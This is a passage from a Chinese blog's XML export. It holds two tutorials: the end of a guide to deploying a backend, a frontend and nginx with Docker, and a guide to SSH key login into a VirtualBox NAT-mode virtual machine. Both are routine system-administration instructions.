<li><p>这三个文件都准备好后，就在该目录下执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t your_backend_name:1.0.0 .</span><br><span class="line">docker run -d -p 8080:8080 --name your_backend_container_name --network your_network_name your_backend_name:1.0.0</span><br></pre></td></tr></table></figure></li>
</ul>
<p>输入<code>docker ps</code>查看部署情况：</p>
<p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/8102b7624f46ac70b15808619bd45907.png" alt="查看后端部署情况"></p>
<p>至此后端部署完成。</p>
<h2 id="四、部署前端"><a href="#四、部署前端" class="headerlink" title="四、部署前端"></a>四、部署前端</h2><ul>
<li><p>和后端一样，在部署前端之前要先对前端项目进行打包。直接在前端项目目录下输入命令<code>npm run build</code>既可完成打包。成功之后应该会生成一个<code>dist/</code>文件夹，这个文件夹里面的东西就是我们部署需要的资源。</p>
<p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/f993850605cb0bc06581c4525c984ba6.png" alt="dist文件夹"></p>
</li>
<li><p>创建目录<code>/opt/your_project_name/nginx</code>和<code>/opt/your_project_name/nginx/html</code>，将<code>dist/</code>文件下的全部东西都放<code>html/</code>文件下，然后在<code>nginx/</code>文件夹下我们还需要一个<code>nginx.conf</code>文件来配置nginx服务。</p>
<p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/015635b869338c4c2d393fa45af91a0c.png" alt="nginx文件结构"></p>
</li>
<li><p><code>nginx.conf</code>文件(示例)如下：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">worker_processes</span>  <span class="number">1</span>; //处理器使用数量</span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span>  <span class="number">256</span>;  //最大连接数</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">include</span>       mime.types;</span><br><span class="line">    <span class="attribute">default_type</span>  application/octet-stream;</span><br><span class="line">    <span class="attribute">sendfile</span>        <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">keepalive_timeout</span>  <span class="number">65</span>;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">server_name</span>  your_sever_public_ip;</span><br><span class="line"></span><br><span class="line">        <span class="section">location</span> / &#123;  //资源定位</span><br><span class="line">            <span class="attribute">root</span>   /usr/share/nginx/html;</span><br><span class="line">            <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="section">location</span> /prod-api/ &#123;  //将/prod-api请求转发到后端</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://your_backend_container_name:8080/;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Forwarded-Proto <span class="variable">$scheme</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">error_page</span>   <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span>  /50x.html;</span><br><span class="line">        <span class="section">location</span> = /50x.html &#123;</span><br><span class="line">            <span class="attribute">root</span>   html;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为这里是监听<code>/prod-api</code>请求并转发到后端的8080端口，所以不要修改你前端的<code>main.ts</code>文件：</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">axios.<span class="property">defaults</span>.<span class="property">baseURL</span> = (<span class="string">&quot;http://your_sever_public_ip/prod-api&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>最后执行以下命令来部署nginx：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 80:80 \</span><br><span class="line">  -v /opt/ruoyi/nginx/nginx.conf:/etc/nginx/nginx.conf -v /opt/ruoyi/nginx/html:/usr/share/nginx/html \</span><br><span class="line">  --name your_nginx_container_name --network your_network_name \</span><br><span class="line">  nginx:latest</span><br></pre></td></tr></table></figure></li>
</ul>
<p>输入<code>docker ps</code>来查看服务：</p>
<p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/70d45e59357c2f555d9c4f088687f0d9.png" alt="查看nginx服务"></p>
<p>至此，三个服务都已部署成功。</p>
<h2 id="五、一些踩过的坑"><a href="#五、一些踩过的坑" class="headerlink" title="五、一些踩过的坑"></a>五、一些踩过的坑</h2><ul>
<li><p>jar包运行失败或者是找不到主类。运行失败可能是jdk版本的问题，如果是找不到主类的话检查后端的<code>pom.xml</code>文件，为主类添加<code>&lt;skip&gt;</code>配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.example.smartpricing.SmartPricingApplication<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">skip</span>&gt;</span>false<span class="tag">&lt;/<span class="name">skip</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>同时本地可以通过命令<code>java -jar your_jar_name.jar</code>来检查jar包能否正常运行，部署完后也可以通过命令<code>docker logs your_backend_container_name</code>来检查后端是否已经正常启动。</p>
</li>
<li><p>http访问公网ip显示无法访问此页面。检查你的云服务器是否开放了80(http)端口，如果没有将其开放即可。</p>
<p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post8/8d67382ae1d5d4442d5a010d6a840be7.png" alt="检查http端口"></p>
</li>
</ul>
]]></content>
      <tags>
        <tag>教程</tag>
        <tag>Docker</tag>
        <tag>前端</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>通过ssh连接VirtualBox的nat网络模式下的虚拟机</title>
    <url>/post/46d9de96.html</url>
    <content><![CDATA[<p>写在前面：因为这学期要上传奇史课os，课程要求使用OpenEuler系统，为了方便用vscode编程使用了ssh来连接虚拟机。折腾的过程中发现桥接模式会随着你网络环境他的变化而产生网段的变化导致ssh配置发生变动，而nat模式下的虚拟机ip不会产生改变。而使用nat网络模式来进行连接相对麻烦一点儿，故有了该文章。</p>
<h2 id="一、设置端口转发"><a href="#一、设置端口转发" class="headerlink" title="一、设置端口转发"></a>一、设置端口转发</h2><p>因为nat模式下尽管虚拟机ping得通主机，但是主机ping不通虚拟机的话ssh连接仍然是不可行的，所以必须要先进行端口转发。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post4/faf3354a84b2e246498fc6d54d9b36a3.png" alt="ping不通"><br>设置端口转发也非常简单，首先点击VirtualBox左上角的<strong>管理</strong>，选择其中的<strong>工具</strong>，在工具的菜单栏中选择<strong>网络管理器</strong>。或者是直接使用快捷键<code>Ctrl+H</code>打开。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post4/2025-03-02211905.png" alt="网络管理器"><br>之后先点开<strong>属性</strong>，选择<strong>NAT网络</strong>，在下方选择<strong>端口转发</strong>，点击右边的”+“添加新规则。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post4/696a0650dd9826ab8672748c8fb4952e.png" alt="端口转发"><br>主机ip和子系统端口和上图保持一致，除非你ssh端口自定义了非22端口。主机端口可以自己改动，只要该端口没有被占用就行。需要注意的是子系统ip要和你的虚拟机保持一致。至于如何获得子系统的ip，需要打开子系统输入命令<code>ip addr</code>来查看，一般如果你没有进行特别的修改，ip都应该为<code>10.0.2.xx</code>。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post4/0959d4c2d5f800fd252dcea6d92442ac.png" alt="子系统ip"><br>输入好后，点击右下角的应用开始转发。</p>
<h2 id="二、虚拟机的准备"><a href="#二、虚拟机的准备" class="headerlink" title="二、虚拟机的准备"></a>二、虚拟机的准备</h2><p>要想进行ssh连接，你的虚拟机必须要开启sshd服务，关于如何安装sshd服务请左转自行谷歌。<br>输入以下命令来设置ssh服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> sshd <span class="comment">#启用sshd开机自启动</span></span><br><span class="line">systemctl start sshd <span class="comment">#启用sshd服务</span></span><br><span class="line">systemctl status sshd <span class="comment">#查看sshd服务状态</span></span><br></pre></td></tr></table></figure>

<p>最后你的sshd服务状态应该类似于下图：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post4/aeff68d211b9570b69abd352cbb28854.png" alt="sshd-status"></p>
<h2 id="三、ssh相关设置"><a href="#三、ssh相关设置" class="headerlink" title="三、ssh相关设置"></a>三、ssh相关设置</h2><ul>
<li><p>测试连接<br>现在在确保虚拟机开着的情况下可以进行ssh的连接了。在cmd中输入以下命令<code>ssh -p 你设置的主机端口号 username(你想用什么身份登陆你的虚拟机)@127.0.0.1</code>来测试连接，若提示你输入密码进行登录则说明连接成功。</p>
</li>
<li><p>配置密钥登录<br>如果不配置密钥，在vscode中打开一个文件夹就要输入一次密码，极其的麻烦。而且以后工作的时候肯定是使用安全的密钥登录，所以用密钥登陆是很有必要的。</p>
<ul>
<li><p>在cmd输入命令<code>ssh-keygen -t rsa -b 4096</code>生成一对rsa密钥(之后一直回车即可)，如果你之前已经生成了密钥了，那就用你之前的密钥就行。</p>
</li>
<li><p>进入<code>C/Users/你的用户名/.ssh</code>文件夹，你应该在这里能找到你之前生成的密钥对。在这里右键打开terminal，输入命令<code>scp -P 你设置的主机端口号 id_rsa.pub username@127.0.0.1:~(可以改成你想要的目录)</code>，这一步是将公钥文件传给你的虚拟机。</p>
</li>
<li><p>打开你的虚拟机，找到你传入的公钥文件，输入以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">cat</span> id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>最后是对sshd的一些配置<br>修改<code>/etc/ssh/sshd_config</code>文件，将对应行修改成下面那样：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PermitRootLogin prohibit-password #限制不能使用密码登录root用户</span><br><span class="line">PubkeyAuthentication yes #允许使用公钥进行登录</span><br><span class="line">PasswordAuthentication no #禁止使用密码登录</span><br><span class="line">AllowTcpForwarding yes #允许进行ssh端口的tcp转发</span><br></pre></td></tr></table></figure></li>
</ul>
<p>之后再进行ssh连接，你会发现直接连接成功，最后在vscode输入之前的ssh连接命令即可成功远程登陆虚拟机。</p>
<h2 id="四、踩过的坑"><a href="#四、踩过的坑" class="headerlink" title="四、踩过的坑"></a>四、踩过的坑</h2><p>因为我之前已经有了rsa密钥，我把生成的新的rsa密钥命名成了自定义的名字，然后发现怎么都连接不成功。搜索后发现原来ssh会按照一定顺序扫描已有的私钥，而自定义名字的私钥是最后扫描的，导致ssh在扫描到之前就认为你的私钥已经是错误的了(居然不是遍历！！！)。<br>这种情况需要在ssh连接命令中加入参数<code>-i</code>来指定你要使用的私钥来进行连接。</p>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>ssh</tag>
        <tag>虚拟机</tag>
        <tag>VirtualBox</tag>
      </tags>
  </entry>
</search>
